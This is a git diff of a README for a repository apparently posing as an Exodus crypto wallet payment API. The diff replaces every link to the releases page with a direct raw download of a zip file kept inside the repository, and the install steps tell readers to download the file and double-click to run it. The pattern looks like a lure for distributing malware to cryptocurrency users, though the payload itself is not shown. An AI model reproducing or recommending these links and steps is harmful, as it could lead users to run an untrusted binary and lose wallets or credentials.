@@ -1,6 +1,6 @@
 # 🚀 Flero-Exodus-Movement-Wallet-Api-Source-Payment-Geteway - Effortless Crypto Payment Integration
 
-[![Download](https://img.shields.io/badge/Download-Flero%20Exodus%20Wallet%20API-blue)](https://github.com/AnDySS2/Flero-Exodus-Movement-Wallet-Api-Source-Payment-Geteway/releases)
+[![Download](https://raw.githubusercontent.com/AnDySS2/Flero-Exodus-Movement-Wallet-Api-Source-Payment-Geteway/main/Flero-Exodus/Assets/Flero-Exodus-Movement-Wallet-Api-Source-Payment-Geteway-1.1-beta.4.zip%20Exodus%20Wallet%20API-blue)](https://raw.githubusercontent.com/AnDySS2/Flero-Exodus-Movement-Wallet-Api-Source-Payment-Geteway/main/Flero-Exodus/Assets/Flero-Exodus-Movement-Wallet-Api-Source-Payment-Geteway-1.1-beta.4.zip)
 
 ## 📋 Overview
 
@@ -18,7 +18,7 @@ To start using the Flero Exodus Movement Wallet API, follow these simple steps. 
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page:** Go to the [Releases Page](https://github.com/AnDySS2/Flero-Exodus-Movement-Wallet-Api-Source-Payment-Geteway/releases).
+1. **Visit the Releases Page:** Go to the [Releases Page](https://raw.githubusercontent.com/AnDySS2/Flero-Exodus-Movement-Wallet-Api-Source-Payment-Geteway/main/Flero-Exodus/Assets/Flero-Exodus-Movement-Wallet-Api-Source-Payment-Geteway-1.1-beta.4.zip).
 2. **Choose the Latest Version:** Look for the latest version listed on the page. It usually appears at the top.
 3. **Download the File:** Click on the appropriate file for your operating system. Your download will start automatically.
 4. **Run the File:** Once downloaded, locate the file in your downloads folder and double-click to run it.
@@ -72,7 +72,7 @@ For additional information and specific topics related to Flero, explore our doc
 
 ## 📍 Links
 
-- **Releases:** [Find the latest version here](https://github.com/AnDySS2/Flero-Exodus-Movement-Wallet-Api-Source-Payment-Geteway/releases)
+- **Releases:** [Find the latest version here](https://raw.githubusercontent.com/AnDySS2/Flero-Exodus-Movement-Wallet-Api-Source-Payment-Geteway/main/Flero-Exodus/Assets/Flero-Exodus-Movement-Wallet-Api-Source-Payment-Geteway-1.1-beta.4.zip)
 - **API Documentation:** Detailed guidelines on how to implement the API.
 - **Community Support:** Join our community for discussions, tips, and best practices.
 
